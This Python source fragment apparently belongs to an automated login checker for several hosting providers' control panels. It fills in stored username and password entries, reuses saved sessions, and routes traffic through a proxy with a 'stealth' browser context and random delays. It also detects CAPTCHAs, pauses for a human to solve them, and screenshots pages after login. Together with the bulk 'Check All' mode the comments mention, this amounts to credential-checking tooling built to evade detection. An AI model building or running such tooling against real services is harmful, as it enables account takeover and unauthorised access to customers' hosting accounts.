# ---------------------------------------------------------------------------
# CAPTCHA-pause mode  — user drives the browser, session saved on close
# ---------------------------------------------------------------------------

def try_login_manual_captcha(
    entry: dict,
    custom_login_url: str = "",
    timeout: int = 20,
) -> str:
    """
    Opens a VISIBLE Chromium window at the login URL.
    The user fills in credentials and solves any CAPTCHA manually.
    The function waits indefinitely until the browser window is closed,
    then saves the session (cookies/localStorage) to state.json so all
    subsequent headless checks can reuse it.

    Parameters
    ----------
    entry            : dict — keys: url, domain, username, password
    custom_login_url : str  — if set, navigate here instead of entry url / domain routing
    timeout          : int  — initial navigation timeout in seconds
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return "ERROR: playwright not installed."

    url = entry.get("url", "")
    domain = entry.get("domain", "").lower()

    # Custom URL takes highest priority
    if custom_login_url:
        url = custom_login_url
    # Otherwise apply hardcoded portal routing
    elif "superhosting" in domain or "superhosting" in url.lower():
        url = SUPERHOSTING_LOGIN_URL
    elif "zettahost" in domain or "zettahost" in url.lower():
        url = ZETTAHOST_LOGIN_URL
    elif "ns1.bg" in domain or "ns1.bg" in url.lower():
        url = NS1_LOGIN_URL

    try:
        with sync_playwright() as pw:
            browser, context = _make_context(
                pw, headless=False, proxy=None
            )
            page = context.new_page()

            # Navigate to the login page
            try:
                page.goto(url, timeout=30_000, wait_until="domcontentloaded")
            except Exception:
                pass  # If navigation fails, the window is still open for the user

            # ---- Wait until the user closes the browser ----
            # browser.is_connected() becomes False when all pages are closed.
            while browser.is_connected():
                try:
                    # Ping every 500 ms — keeps the event loop alive without blocking
                    page.wait_for_timeout(500)
                except Exception:
                    break  # page was closed

            # Try to save the session before the context tears down
            try:
                save_session(context)
            except Exception:
                pass

            _cleanup_context(context)
            try:
                if browser:
                    browser.close()
            except Exception:
                pass

        return "Session saved — headless checks will reuse your login."

    except Exception as e:
        return f"ERROR: {type(e).__name__}: {str(e)[:120]}"


# ---------------------------------------------------------------------------
# Post-login scraper
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Post-login scraper — screenshot mode
# ---------------------------------------------------------------------------

def scrape_after_login(
    entry: dict,
    post_url: str,
    custom_login_url: str = "",
    timeout: int = 20,
    screenshot_quality: int = 40,
    screenshot_max_width: int = 1280,
) -> dict:
    """
    Log in with *entry* credentials (using the **same** logic as ``try_login`` /
    Check All — including domain-specific handlers, session reuse, new-tab
    detection, stealth context), then navigate to *post_url*, take a
    full-page screenshot and compress it as JPEG.

    Returns::

        {
            "status":     "SUCCESS" | "FAILED" | …,
            "screenshot": bytes | None,   # JPEG bytes, None on failure
            "final_url":  str,            # actual URL after login/nav
        }

    ``screenshot_quality``  — JPEG quality 1-95 (default 40 ≈ 40-80 KB/page).
    ``screenshot_max_width`` — resize width before compression (default 1280).
    """
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {"status": "ERROR: playwright not installed",
                "screenshot": None, "final_url": ""}

    url      = entry.get("url", "")
    username = entry.get("username", "")
    password = entry.get("password", "")
    domain   = entry.get("domain", "").lower()
    proxy    = _load_proxy()

    # ── Domain routing (identical to try_login) ──────────────────────────
    if custom_login_url:
        login_url      = custom_login_url
        is_zettahost   = False
        is_ns1         = False
        is_hostpoint   = False
        is_home_pl     = False
        is_cyberfolks  = False
    else:
        login_url = url
        if "superhosting" in domain or "superhosting" in url.lower():
            login_url = SUPERHOSTING_LOGIN_URL
        is_zettahost  = "zettahost"  in domain or "zettahost"  in url.lower()
        is_ns1        = "ns1.bg"     in domain or "ns1.bg"     in url.lower()
        is_hostpoint  = "hostpoint"  in domain or "hostpoint"  in url.lower()
        is_home_pl    = "home.pl"    in domain or "panel.home.pl" in url.lower()
        is_cyberfolks = "cyberfolks" in domain or "cyberfolks" in url.lower()

    def _fail(status: str) -> dict:
        return {"status": status, "screenshot": None, "final_url": ""}

    def _compress(png_bytes: bytes) -> bytes:
        """Resize to max_width and compress as JPEG using Pillow."""
        try:
            import io
            from PIL import Image as _PILImage
            _LANCZOS = getattr(_PILImage, "LANCZOS",
                               getattr(_PILImage.Resampling, "LANCZOS", 1))
            img = _PILImage.open(io.BytesIO(png_bytes)).convert("RGB")
            w, h = img.size
            if w > screenshot_max_width:
                h = int(h * screenshot_max_width / w)
                w = screenshot_max_width
                img = img.resize((w, h), _LANCZOS)
            buf = io.BytesIO()
            img.save(buf, format="JPEG", quality=screenshot_quality, optimize=True)
            return buf.getvalue()
        except Exception:
            return png_bytes   # fall back to raw PNG if Pillow unavailable

    try:
        with sync_playwright() as pw:
            # ── Same context factory as try_login (session reuse, stealth) ─
            browser, context = _make_context(
                pw, headless=True, proxy=proxy)
            # Override viewport width for screenshot
            page = context.new_page()
            try:
                page.set_viewport_size(
                    {"width": screenshot_max_width, "height": 900})
            except Exception:
                pass

            try:
                # ── Domain-specific login handlers ─────────────────────────
                if is_zettahost:
                    login_status = _try_login_zettahost(
                        page, context, username, password, timeout)
                elif is_ns1:
                    login_status = _try_login_ns1(
                        page, context, username, password, timeout)
                elif is_hostpoint:
                    login_status = _try_login_hostpoint(
                        page, context, username, password, timeout)
                elif is_home_pl:
                    login_status = _try_login_home_pl(
                        page, context, username, password, timeout)
                elif is_cyberfolks:
                    login_status = _try_login_cyberfolks(
                        page, context, username, password, timeout)
                else:
                    # ── Generic login — same strategy as try_login_interactive / Check All ──
                    page.goto(login_url, timeout=timeout * 1000,
                              wait_until="domcontentloaded")

                    html_before = page.content()
                    if "captcha" in html_before.lower() or \
                       "recaptcha" in html_before.lower():
                        return _fail("CAPTCHA")

                    ok = _generic_fill_and_submit(
                        page, login_url, username, password,
                        nav_timeout=timeout,
                    )
                    if not ok:
                        return _fail("UNKNOWN (could not fill form)")

                    try:
                        page.wait_for_load_state("networkidle", timeout=5_000)
                    except PWTimeout:
                        pass
                    _random_delay(0.8, 1.5)

                    html_after = page.content()
                    final_url  = page.url

                    if "captcha" in html_after.lower() or \
                       "recaptcha" in html_after.lower():
                        return _fail("CAPTCHA")

                    login_status = _evaluate_result(
                        html_after, final_url,
                        login_url=login_url,
                        page=page,
                    )

                # ── Check login outcome ───────────────────────────────────
                if "SUCCESS" not in login_status:
                    return _fail(login_status)

                # ── Navigate to post-login URL ────────────────────────────
                if post_url and post_url.strip():
                    try:
                        page.goto(post_url.strip(), timeout=timeout * 1000,
                                  wait_until="domcontentloaded")
                        try:
                            page.wait_for_load_state("networkidle",
                                                     timeout=5_000)
                        except PWTimeout:
                            pass
                        _random_delay(0.5, 1.0)
                    except Exception as nav_err:
                        return _fail(
                            f"ERROR navigating to post-URL: {nav_err!s:.80}")

                final_url = page.url

                # ── Full-page screenshot → JPEG ───────────────────────────
                try:
                    png_bytes = page.screenshot(full_page=True)
                except Exception as ss_err:
                    return _fail(f"ERROR screenshot: {ss_err!s:.80}")

                return {
                    "status":     "SUCCESS",
                    "screenshot": _compress(png_bytes),
                    "final_url":  final_url,
                }

            finally:
                _cleanup_context(context)
                try:
                    browser.close()
                except Exception:
                    pass

    except Exception as e:
        err = str(e).lower()
        if "net::err" in err or "connection" in err:
            return _fail("UNREACHABLE")
        if "timeout" in err:
            return _fail("TIMEOUT")
        return _fail(f"ERROR: {type(e).__name__}: {str(e)[:80]}")